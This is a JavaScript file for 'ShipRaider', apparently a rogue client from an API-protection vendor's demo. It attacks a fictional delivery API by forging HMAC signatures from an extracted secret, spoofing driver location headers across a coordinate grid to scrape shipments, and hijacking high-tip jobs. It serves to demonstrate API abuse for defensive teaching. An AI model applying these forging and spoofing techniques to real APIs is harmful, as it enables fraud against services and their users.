/*****************************************************************************
 * Project:     ShipRaider API Protection (Server)
 * File:        shipraider.js
 * Original:    Created on 6 Oct 2017 by Simon Rigg
 * Copyright(c) 2002 - 2017 by CriticalBlue Ltd.
 *
 * The rogue ShipFast 'ShipRaider' web server's JQuery logic script.
 *****************************************************************************/

let shipments = {}

$("#send-bitcoin-button").click(function() {
    alert("Pay me the money!")
})

let lock = new Auth0Lock(AUTH0_CLIENT_ID, AUTH0_DOMAIN, {
    auth: {
        redirectUrl: window.url,
        responseType: "id_token",
        redirect: true
    },
    oidcConformant: false,
    autoclose: true,
    allowSignUp: false,
    theme: {
        logo: 'images/auth0lock.png'
    }
})
lock.on("authenticated", function(authResult) {
    $("#user-auth-token-input").val(authResult.idToken)
})

$("#login-button").click(function() {
    lock.show()
})

$("#search-shipments-button").click(function(event) {
    event.preventDefault()
    searchForShipments()
})

$("#refresh-shipments-button").click(function(event) {
    event.preventDefault()
    searchForShipments()
})

const getShipfastApiUrl = function(endpoint) {
    return $("#shipfast-api-url").val() + "/" + getShipfastApiVersion() + endpoint
}

const getShipfastApiVersion = function() {
    return $("#shipfast-api-version").val()
}

const getShipfastDemoStage = function() {
    return $("#shipfast-demo-stage").val()
}

const getShipFastAPIKey = function() {
    return $("#shipfast-api-key-input").val()
}

const getUserAuthToken = function() {
    const auth = $("#user-auth-token-input").val()

    if (!auth) {
        alert("Man, you need to login first!!!")
        return undefined
    }

    return "Bearer " + auth
}

const getDriverLatitude = function() {
    return $("#location-latitude-input").val()
}

const getDriverLongitude = function() {
    return $("#location-longitude-input").val()
}

const showAlertOnError = function() {
    if (getShipfastApiVersion() == "v4") {
        alert("Man it doesn't work... this API is now protected by Approov!!!")
    } else {
        alert("Man, it didn't work this time!")
    }
}

const searchForShipments = function() {
    updateProgressBar(0)
    shipments = {}

    let count = 0
    let progress = 0

    let driver_latitude = getDriverLatitude()
    let driver_longitude = getDriverLongitude()
    let locationSweepRadius = $("#location-sweep-radius-input").val()
    let locationSweepStep = $("#location-sweep-step-input").val()

    let halfLBR = parseFloat(locationSweepRadius) / 2.0
    let locStep = parseFloat(locationSweepStep)
    let latStart = parseFloat(driver_latitude) - halfLBR
    let latEnd = parseFloat(driver_latitude) + halfLBR
    let lonStart = parseFloat(driver_longitude) - halfLBR
    let lonEnd = parseFloat(driver_longitude) + halfLBR

    let totalProgress = Math.pow(parseFloat(locationSweepRadius) / locStep, 2)

    $("#results-table-body").empty()

    let auth = getUserAuthToken()

    if (auth == undefined) {
        return
    }

    let url = getShipfastApiUrl("/shipments/nearest_shipment")

    const fetchNearestShipment = function(latVal, lonVal, url, auth) {

        $.ajax({
            url: url,
            headers: {
                "API-KEY" : getShipFastAPIKey(),
                "Authorization" : auth,
                "HMAC" : computeHMAC(url, auth),
                "DRIVER-LATITUDE" : latVal.toString(),
                "DRIVER-LONGITUDE" : lonVal.toString()
            },
            method: "GET",
            timeout: 5000,
            async:false,
            success: function(json) {
                let shipmentID = json["id"]
                let shipmentPickupLatitude = json["pickupLatitude"]
                let shipmentPickupLongitude = json["pickupLongitude"]
                shipments[shipmentID] = json
                addShipmentsToResults()
                updateProgressBar(Math.min(Math.round((progress / totalProgress) * 100), 100))
                progress++
            }
        })
    }

    fetchNearestShipment(parseFloat(driver_latitude), parseFloat(driver_longitude), url, auth)

    for (let lat = latStart; lat <= latEnd; lat += locStep) {
        for (let lon = lonStart; lon <= lonEnd; lon += locStep) {
            if (count++ > 100) {
                totalProgress = 1
                let isEmptyTableBody = $("#results-table-body").is(':empty')

                if (isEmptyTableBody) {
                    setTimeout(showAlertOnError, 1000)
                }

                updateProgressBar(100)

                return
            }
            fetchNearestShipment(lat, lon, url, auth)
        }
    }
}

const updateProgressBar = function(progress) {
    $(".progress-bar").attr("aria-valuenow", progress).attr("style", "width: " + progress + "%")
    $("#progress-bar-text").text(progress + "% Complete")
}

const addShipmentsToResults = function() {
    let resultsTableBody = $("#results-table-body")
    resultsTableBody.empty()
    Object.entries(shipments).forEach(
        ([shipmentID, json]) => {
            shipmentID = json["id"]
            let shipmentName = json["description"]
            let shipmentGratuity = json["gratuity"]
            let shipmentPickup = json["pickupName"]
            let shipmentPickupDistance = json["pickupDistance"]
            let shipmentDelivery = json["deliveryName"]
            let gratuityRowClass = "no-gratuity"
            let gratuityValueClass = "no-gratuity"
            let buttonClass = "btn-default"

            if (shipmentGratuity.substr(1) > 0) {
                gratuityRowClass = "gratuity-row"
                gratuityValueClass = "with-gratuity"
                buttonClass = "btn-success"
            }

            if (shipmentGratuity.substr(1) > 5) {
                gratuityValueClass = "good-gratuity"
            }

            let grabShipmentButton = "<button type='button' class='btn " + buttonClass + "' id='shipment-" + shipmentID + "'>Grab It!</button>"
            resultsTableBody.append(
                  "<tr id=shipment-row-" + shipmentID + " class=" + gratuityRowClass + ">"
                + "<td>" + shipmentID + "</td>"
                + "<td>" + shipmentName + "</td>"
                + "<td class=" + gratuityValueClass + ">" + shipmentGratuity + "</td>"
                + "<td>" + shipmentPickup + "</td>"
                + "<td>" + shipmentPickupDistance + "</td>"
                + "<td>" + shipmentDelivery + "</td>"
                + "<td>" + grabShipmentButton + "</td>"
                + "</tr>")

            $("#shipment-" + shipmentID).click(function(event) {
                event.preventDefault()
                grabShipment(shipmentID)
            })
        }
    )
}

const grabShipment = function(shipmentID) {
    let url = getShipfastApiUrl("/shipments/update_state/" + shipmentID)
    let auth = getUserAuthToken()
    $.ajax({
        url: url,
        headers: {
            "API-KEY" : getShipFastAPIKey(),
            "Authorization" : auth,
            "HMAC" : computeHMAC(url, auth),
            "DRIVER-LATITUDE" : getDriverLatitude(),
            "DRIVER-LONGITUDE" : getDriverLongitude(),
            "SHIPMENT-STATE" : "1"
        },
        method: "POST",
        timeout: 5000,
        async: false,
        success: function(json) {
            updateProgressBar(100)
            $("#shipment-row-" + shipmentID).addClass("active-shipment")
            $("#shipment-" + shipmentID).prop('disabled', true);
            alert("You got shipment ID" + shipmentID + " - check the app and enjoy the extra cash!\n\n@crackmaapi - don't forget da bitcoin pls")
        },
        error: function(xhr) {
            showAlertOnError()
            updateProgressBar(0)
        }
    })

}

const computeHMAC = function(url, idToken) {
    currentDemoStage = getShipfastDemoStage()

    if (currentDemoStage == SHIPFAST_DEMO_STAGE_HMAC_STATIC_SECRET_PROTECTION
            || currentDemoStage == SHIPFAST_DEMO_STAGE_HMAC_DYNAMIC_SECRET_PROTECTION)  {
        let hmacSecret
        if (currentDemoStage == SHIPFAST_DEMO_STAGE_HMAC_STATIC_SECRET_PROTECTION) {
            // Just use the static secret in the HMAC for this demo stage
            hmacSecret = HMAC_SECRET
        }
        else if (currentDemoStage == SHIPFAST_DEMO_STAGE_HMAC_DYNAMIC_SECRET_PROTECTION) {
            // Obfuscate the static secret to produce a dynamic secret to
            // use in the HMAC for this demo stage
            let staticSecret = HMAC_SECRET
            let dynamicSecret = CryptoJS.enc.Base64.parse(staticSecret)
            let shipFastAPIKey = CryptoJS.enc.Utf8.parse($("#shipfast-api-key-input").val())
            for (let i = 0; i < Math.min(dynamicSecret.words.length, shipFastAPIKey.words.length); i++) {
                dynamicSecret.words[i] ^= shipFastAPIKey.words[i]
            }
            dynamicSecret = CryptoJS.enc.Base64.stringify(dynamicSecret)
            hmacSecret = dynamicSecret
        }

        if (hmacSecret) {
            let parser = document.createElement('a')
            parser.href = url
            let msg = parser.protocol.substring(0, parser.protocol.length - 1)
                + parser.hostname + parser.pathname + idToken
            let hmac = CryptoJS.HmacSHA256(msg, CryptoJS.enc.Base64.parse(hmacSecret)).toString(CryptoJS.enc.Hex)
            return hmac
        }
    }
    return null
}
